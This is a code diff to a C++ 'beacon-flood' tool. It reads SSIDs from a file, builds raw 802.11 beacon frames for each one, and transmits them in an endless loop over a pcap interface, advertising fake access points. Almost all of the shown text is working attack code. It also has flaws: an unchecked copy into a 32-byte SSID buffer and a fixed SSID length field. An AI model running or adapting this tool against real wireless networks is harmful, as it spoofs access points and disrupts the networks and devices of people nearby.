@@ -3,11 +3,14 @@
 #include <pcap.h>
 #include <string>
 #include <vector>
-#include <tins/tins.h>
+#include <cstdint>
+#include <array>
+#include <algorithm>
+#include <chrono>
+#include <thread>
 #include "radiotap.h"
 
 using namespace std;
-using namespace Tins;
 
 void usage() {
 	printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
@@ -85,11 +88,25 @@ int main(int argc, char* argv[]) {
         0x0c11
     };
 
-    SSIDParameter ssidParameter = {
-        0x00,
-        0x07,
-        {0x41, 0x62, 0x43, 0x64, 0x45, 0x66, 0x47}
-    };
+    uint8_t tempSSID[32];
+    vector<SSIDParameter> ssidParameters;
+
+    for (int i = 0; i < SSIDList.size(); i++) {
+
+        for (int j = 0; j < SSIDList[i].size(); j++) {
+            tempSSID[j] = SSIDList[i].data()[j];
+        }
+
+        SSIDParameter ssidParameter = {
+            0x00,
+            0x20,
+            array<uint8_t, 32>{}
+        };
+
+        copy(tempSSID, tempSSID + SSIDList[i].size(), ssidParameter.SSID.begin());
+
+        ssidParameters.push_back(ssidParameter);
+    }
 
     SupportedRates supportedRates = {
         0x01,
@@ -127,44 +144,29 @@ int main(int argc, char* argv[]) {
         {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
     };
 
-    TestPacket testpacket = {
-        radiotap,
-        beaconFrame,
-        ssidParameter,
-        supportedRates,
-        trafficIndicationMap,
-        htCapabilities,
-        htInformation,
-        0x4321abcd
-    };
-
-    // Generate Sample Packet
-    // RadioTap tap;
-    // Dot11::address_type ap        = "00:11:22:33:44:55";
-    // Dot11::address_type broadcast = "ff:ff:ff:ff:ff:ff";
-    // Dot11Beacon beacon(broadcast, ap);
-    // beacon.addr4(ap);
-    // beacon.ssid("TESTSSID");
-    // beacon.ds_parameter_set(1);
-    // beacon.supported_rates({ 1.0f, 5.5f, 11.0f });
-    // tap.inner_pdu(beacon);
-    // PacketSender sender("wlan0");
-    // RadioTap radio = RadioTap() / Dot11Beacon();
-    // PacketWriter writer("/tmp/output.pcap", PacketWriter::RADIOTAP);
-    // writer.write(radio);
-
-
-
-
     // Send Packet
     // int pcap_sendpacket(pcap_t *p, const u_char *buf, int size);
     while (true) {
-        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&testpacket), sizeof(testpacket));
-        if (res != 0) {
-            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-        }
+        for (int i = 0; i < SSIDList.size(); i++) {
+            TestPacket testpacket = {
+                radiotap,
+                beaconFrame,
+                ssidParameters[i],
+                supportedRates,
+                trafficIndicationMap,
+                htCapabilities,
+                htInformation,
+                0x4321abcd
+            };
 
-        sleep(0.1);
+            int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&testpacket), sizeof(testpacket));
+            if (res != 0) {
+                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+            }
+
+            chrono::milliseconds sleepDuration(10);
+            this_thread::sleep_for(sleepDuration);
+        }
     }
 
 	pcap_close(pcap);
